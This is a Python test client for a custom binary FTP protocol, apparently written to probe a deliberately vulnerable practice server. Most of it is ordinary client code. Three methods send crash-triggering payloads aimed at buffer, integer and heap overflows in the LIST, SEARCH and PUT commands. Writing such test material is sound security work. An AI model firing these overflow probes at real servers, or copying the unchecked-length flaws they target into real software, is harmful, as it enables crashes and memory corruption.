#!/usr/bin/env python3
"""
Simple test client for the custom FTP server
Demonstrates the binary protocol and can be used to test vulnerabilities
"""

import socket
import struct
import sys


class FTPClient:
    def __init__(self, host="localhost", port=2121):
        self.host = host
        self.port = port
        self.socket = None
        self.authenticated = False

    def connect(self):
        """Connect to the FTP server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            print(f"Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False

    def disconnect(self):
        """Disconnect from the server"""
        if self.socket:
            self.socket.close()
            self.socket = None
            print("Disconnected")

    def send_packet(self, cmd_type, data=b""):
        """Send a packet to the server"""
        magic = 0x46545021  # "FTP!"
        length = len(data)

        # Pack header: magic(4) + type(1) + length(2)
        header = struct.pack(">IbH", magic, cmd_type, length)

        # Send header + data
        self.socket.send(header + data)

    def recv_packet(self):
        """Receive a packet from the server"""
        # Receive header (7 bytes)
        header_data = self.socket.recv(7)
        if len(header_data) < 7:
            return None, None

        magic, cmd_type, length = struct.unpack(">IbH", header_data)

        if magic != 0x46545021:
            print("Invalid magic number received")
            return None, None

        # Receive payload
        payload = b""
        if length > 0:
            payload = self.socket.recv(length)

        return cmd_type, payload

    def login(self, username, password):
        """Login with username and password"""
        # Pack login data: username_len(1) + username + password_len(1) + password
        username_bytes = username.encode("utf-8")
        password_bytes = password.encode("utf-8")

        data = (
            struct.pack("B", len(username_bytes))
            + username_bytes
            + struct.pack("B", len(password_bytes))
            + password_bytes
        )

        self.send_packet(0x01, data)  # CMD_LOGIN

        # Receive response
        resp_type, payload = self.recv_packet()
        if resp_type == 0x9F:  # RESP_GENERIC
            status = payload[0]
            msg_len = struct.unpack(">H", payload[1:3])[0]
            message = payload[3 : 3 + msg_len].decode("utf-8")

            if status == 0x00:  # SUCCESS
                print(f"Login successful: {message}")
                self.authenticated = True
                return True
            else:
                print(f"Login failed: {message}")
                return False

        return False

    def login_anonymous(self):
        """Login as anonymous user"""
        self.send_packet(0x02)  # CMD_ANONYMOUS

        # Receive response
        resp_type, payload = self.recv_packet()
        if resp_type == 0x9F and payload:  # RESP_GENERIC
            status = payload[0]
            msg_len = struct.unpack(">H", payload[1:3])[0]
            message = payload[3 : 3 + msg_len].decode("utf-8")

            if status == 0x00:  # SUCCESS
                print(f"Anonymous login successful: {message}")
                self.authenticated = True
                return True
            else:
                print(f"Anonymous login failed: {message}")
                return False

        return False

    def register(self, username, password):
        """Register a new user account"""
        # Pack registration data: username_len(1) + username + password_len(1) + password
        username_bytes = username.encode("utf-8")
        password_bytes = password.encode("utf-8")

        if len(username_bytes) > 255 or len(password_bytes) > 255:
            return False

        data = (
            struct.pack("B", len(username_bytes))
            + username_bytes
            + struct.pack("B", len(password_bytes))
            + password_bytes
        )

        self.send_packet(0x03, data)  # CMD_REGISTER

        # Receive response
        resp_type, payload = self.recv_packet()
        if resp_type == 0x9F and payload:  # RESP_GENERIC
            status = payload[0]
            msg_len = struct.unpack(">H", payload[1:3])[0]
            message = payload[3 : 3 + msg_len].decode("utf-8")

            if status == 0x00:  # SUCCESS
                print(f"Registration successful: {message}")
                self.authenticated = True
                return True
            else:
                print(f"Registration failed: {message}")
                return False

        return False

    def list_files(self, path=""):
        """List files in directory"""
        if not self.authenticated:
            print("Not authenticated")
            return

        path_bytes = path.encode("utf-8")
        data = struct.pack(">H", len(path_bytes)) + path_bytes

        self.send_packet(0x12, data)  # CMD_LIST

        # Receive response
        resp_type, payload = self.recv_packet()
        if resp_type == 0x91:  # RESP_FILE_LIST
            entry_count = struct.unpack(">H", payload[0:2])[0]
            print(f"Directory listing ({entry_count} entries):")

            offset = 2
            for i in range(entry_count):
                file_type = payload[offset]
                offset += 1

                name_len = struct.unpack(">H", payload[offset : offset + 2])[0]
                offset += 2

                name = payload[offset : offset + name_len].decode("utf-8")
                offset += name_len

                size = struct.unpack(">I", payload[offset : offset + 4])[0]
                offset += 4

                mod_time = struct.unpack(">I", payload[offset : offset + 4])[0]
                offset += 4

                file_type_str = "DIR" if file_type == 1 else "FILE"
                print(f"  {file_type_str:4} {size:8d} {name}")

    def get_file(self, filename):
        """Download a file"""
        if not self.authenticated:
            print("Not authenticated")
            return

        filename_bytes = filename.encode("utf-8")
        data = struct.pack(">H", len(filename_bytes)) + filename_bytes

        self.send_packet(0x10, data)  # CMD_GET

        # Receive response
        resp_type, payload = self.recv_packet()
        if resp_type == 0x90:  # RESP_FILE_DATA
            file_size = struct.unpack(">I", payload[0:4])[0]
            file_data = payload[4 : 4 + file_size]

            print(f"File '{filename}' downloaded ({file_size} bytes)")

            # Save to local file
            with open(filename, "wb") as f:
                f.write(file_data)
            print(f"Saved as '{filename}'")
        elif resp_type == 0x9F:  # Error response
            status = payload[0]
            msg_len = struct.unpack(">H", payload[1:3])[0]
            message = payload[3 : 3 + msg_len].decode("utf-8")
            print(f"Error: {message}")

    def test_list_vulnerability(self):
        """Test the buffer overflow vulnerability in LIST command"""
        print("Testing LIST vulnerability...")

        # Create a long path to overflow the buffer
        long_path = "A" * 300  # Should overflow the 256-byte buffer
        path_bytes = long_path.encode("utf-8")
        data = struct.pack(">H", len(path_bytes)) + path_bytes

        self.send_packet(0x12, data)  # CMD_LIST

        try:
            resp_type, payload = self.recv_packet()
            print("Server responded (might have crashed)")
        except:
            print("Server connection lost (likely crashed)")

    def test_search_vulnerability(self):
        """Test the integer overflow vulnerability in SEARCH command"""
        print("Testing SEARCH integer overflow vulnerability...")

        # Use a very large pattern length to cause integer overflow
        # When pattern_len is 0xFFFFFFFF, pattern_len + 1 wraps to 0
        pattern_len = 0xFFFFFFFF
        max_results = 10
        pattern = b"A" * 100  # Actual pattern data

        data = struct.pack(">II", pattern_len, max_results) + pattern

        self.send_packet(0x17, data)  # CMD_SEARCH

        try:
            resp_type, payload = self.recv_packet()
            print("Server responded (might have crashed)")
        except:
            print("Server connection lost (likely crashed)")

    def test_put_vulnerability(self):
        """Test the heap overflow vulnerability in PUT command"""
        print("Testing PUT heap overflow vulnerability...")

        filename = "test.txt"
        filename_bytes = filename.encode("utf-8")

        # Declare a small file size but send much more data
        declared_size = 10
        actual_data = b"A" * 1000  # Much larger than declared

        data = (
            struct.pack(">H", len(filename_bytes))
            + filename_bytes
            + struct.pack(">I", declared_size)
            + actual_data
        )

        self.send_packet(0x11, data)  # CMD_PUT

        try:
            resp_type, payload = self.recv_packet()
            print("Server responded (might have crashed)")
        except:
            print("Server connection lost (likely crashed)")


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 test_client.py <command> [args...]")
        print("Commands:")
        print("  connect [host] [port]")
        print("  login <username> <password>")
        print("  register <username> <password>")
        print("  anonymous")
        print("  list [path]")
        print("  get <filename>")
        print("  test_vuln <vuln_type>")
        print("    vuln_types: list, search, put")
        return

    client = FTPClient()
    command = sys.argv[1]

    if command == "connect":
        host = sys.argv[2] if len(sys.argv) > 2 else "localhost"
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 2121
        client = FTPClient(host, port)

        if client.connect():
            print("Connected! Use other commands to interact with server.")

    elif command == "login":
        if len(sys.argv) < 4:
            print("Usage: login <username> <password>")
            return

        if client.connect():
            client.login(sys.argv[2], sys.argv[3])
            client.disconnect()

    elif command == "register":
        if len(sys.argv) < 4:
            print("Usage: register <username> <password>")
            return

        if client.connect():
            client.register(sys.argv[2], sys.argv[3])
            client.disconnect()

    elif command == "anonymous":
        if client.connect():
            client.login_anonymous()
            client.disconnect()

    elif command == "list":
        path = sys.argv[2] if len(sys.argv) > 2 else ""
        if client.connect():
            client.login_anonymous()
            client.list_files(path)
            client.disconnect()

    elif command == "get":
        if len(sys.argv) < 3:
            print("Usage: get <filename>")
            return

        if client.connect():
            client.login_anonymous()
            client.get_file(sys.argv[2])
            client.disconnect()

    elif command == "test_vuln":
        if len(sys.argv) < 3:
            print("Usage: test_vuln <vuln_type>")
            print("Types: list, search, put")
            return

        vuln_type = sys.argv[2]
        if client.connect():
            client.login_anonymous()

            if vuln_type == "list":
                client.test_list_vulnerability()
            elif vuln_type == "search":
                client.test_search_vulnerability()
            elif vuln_type == "put":
                client.test_put_vulnerability()
            else:
                print("Unknown vulnerability type")

            client.disconnect()

    else:
        print("Unknown command")


if __name__ == "__main__":
    main()
